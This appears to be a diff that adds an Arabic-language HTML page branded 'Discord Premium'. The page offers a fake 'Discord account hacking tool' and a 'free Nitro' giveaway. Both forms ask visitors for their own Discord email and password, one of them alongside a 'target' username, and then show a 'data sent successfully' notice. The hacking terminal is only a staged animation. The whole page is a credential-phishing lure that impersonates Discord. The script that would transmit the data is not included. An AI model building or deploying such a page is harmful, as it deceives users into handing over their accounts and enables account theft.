@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أداة اختراق ديسكورد | نيترو مجاني</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="glow"></div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fab fa-discord"></i>
+                <h1>Discord Premium</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#" onclick="showPage('page1')" class="active">اختراق الحساب</a></li>
+                    <li><a href="#" onclick="showPage('page2')">النيترو المجاني</a></li>
+                </ul>
+            </nav>
+        </header>
+        
+        <!-- Page 1: Hacking Simulation -->
+        <div id="page1" class="page active">
+            <div class="hack-container">
+                <div class="hack-header">
+                    <h2><i class="fas fa-skull"></i> أداة اختراق حسابات ديسكورد</h2>
+                    <p>أداة متقدمة لاختراق حسابات ديسكورد باستخدام تقنيات الذكاء الاصطناعي المتطورة</p>
+                </div>
+                
+                <div class="hack-terminal" id="terminal">
+                    <div class="terminal-line">$ نظام اختراق Discord Premium v4.2.1</div>
+                    <div class="terminal-line">$ جارٍ تهيئة النظام...</div>
+                    <div class="terminal-line">$ الاتصال بخوادم ديسكورد...</div>
+                    <div class="terminal-line info">$ تم إنشاء نفق آمن</div>
+                    <div class="terminal-line">$ تحليل الثغرات الأمنية...</div>
+                </div>
+                
+                <div class="hack-progress">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span>0%</span>
+                        <span id="progress-text">جارٍ التهيئة...</span>
+                        <span>100%</span>
+                    </div>
+                </div>
+                
+                <div class="hack-buttons">
+                    <button class="btn btn-hack" id="start-hack">
+                        <i class="fas fa-bolt"></i> بدء عملية الاختراق
+                    </button>
+                    <button class="btn btn-skip" onclick="showPage('page2')">
+                        <i class="fas fa-crown"></i> الحصول على نيترو مرة واحدة فقط مجاناً
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Page 2: Nitro Offer -->
+        <div id="page2" class="page">
+            <div class="nitro-container">
+                <div class="nitro-badge">
+                    <i class="fas fa-gift"></i> عرض حصري!
+                </div>
+                
+                <div class="nitro-header">
+                    <h2>احصل على Discord Nitro مجانًا!</h2>
+                    <p>كن واحدًا من أول 100 شخص يحصلون على Nitro مجانًا اليوم فقط!</p>
+                </div>
+                
+                <div class="nitro-content">
+                    <div class="nitro-features">
+                        <div class="feature">
+                            <i class="fas fa-gem"></i>
+                            <h3>رموز مميزة</h3>
+                            <p>احصل على رموز وشخصيات مميزة في جميع السيرفرات</p>
+                        </div>
+                        
+                        <div class="feature">
+                            <i class="fas fa-microphone-alt"></i>
+                            <h3>جودة صوت عالية</h3>
+                            <p>جودة صوت 128kbps لجميع المحادثات الصوتية</p>
+                        </div>
+                        
+                        <div class="feature">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                            <h3>رفع ملفات كبيرة</h3>
+                            <p>رفع ملفات بحجم 100MB بدلاً من 8MB</p>
+                        </div>
+                    </div>
+                    
+                    <div class="nitro-form">
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <h3>تنبيه مهم!</h3>
+                            <p>يجب استخدام البريد الإلكتروني وكلمة المرور المرتبطين بحسابك على ديسكورد لتفعيل الهدية.</p>
+                        </div>
+                        
+                        <form id="nitroForm">
+                            <div class="form-group">
+                                <label for="nitro-email">البريد الإلكتروني لحساب ديسكورد</label>
+                                <div class="input-with-icon">
+                                    <i class="fas fa-envelope"></i>
+                                    <input type="email" id="nitro-email" placeholder="name@example.com" required>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="nitro-password">كلمة المرور</label>
+                                <div class="input-with-icon">
+                                    <i class="fas fa-lock"></i>
+                                    <input type="password" id="nitro-password" placeholder="كلمة المرور" required>
+                                </div>
+                            </div>
+                            
+                            <button type="submit" class="btn-claim">
+                                <i class="fas fa-gift"></i> احصل على النيترو مجانًا!
+                            </button>
+                        </form>
+                    </div>
+                </div>
+                
+                <div class="nitro-footer">
+                    <p>هذا العرض متاح لفترة محدودة فقط. قد يتم تطبيق شروط وأحكام.</p>
+                    <p>© 2023 Discord Inc. هذه الصفحة غير مرتبطة رسميًا بـ Discord.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Login Modal -->
+        <div class="modal" id="loginModal">
+            <div class="modal-content">
+                <span class="close-modal" onclick="closeModal()">&times;</span>
+                <div class="modal-header">
+                    <h3><i class="fas fa-user-secret"></i> تسجيل الدخول للاختراق</h3>
+                    <p>يجب تسجيل الدخول بحساب ديسكورد للعثور على الحساب الذي تريد تهكيره</p>
+                </div>
+                
+                <form id="hackForm">
+                    <div class="form-group">
+                        <label for="hack-email">البريد الإلكتروني لحساب ديسكورد</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-envelope"></i>
+                            <input type="email" id="hack-email" placeholder="name@example.com" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="hack-password">كلمة المرور</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" id="hack-password" placeholder="كلمة المرور" required>
+                        </div>
+                        <div class="form-note">استخدم بيانات تسجيل الدخول الخاصة بحسابك على ديسكورد</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="target-username">اسم الحساب المراد اختراقه</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-target"></i>
+                            <input type="text" id="target-username" placeholder="اسم المستخدم#1234" required>
+                        </div>
+                        <div class="form-note">اكتب هنا اسم الحساب الذي تود تهكيره</div>
+                    </div>
+                    
+                    <button type="submit" class="btn-modal">
+                        <i class="fas fa-play"></i> بدء عملية الاختراق
+                    </button>
+                </form>
+            </div>
+        </div>
+        
+        <div class="notification" id="notification">
+            <i class="fas fa-check-circle"></i> تم إرسال البيانات بنجاح!
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
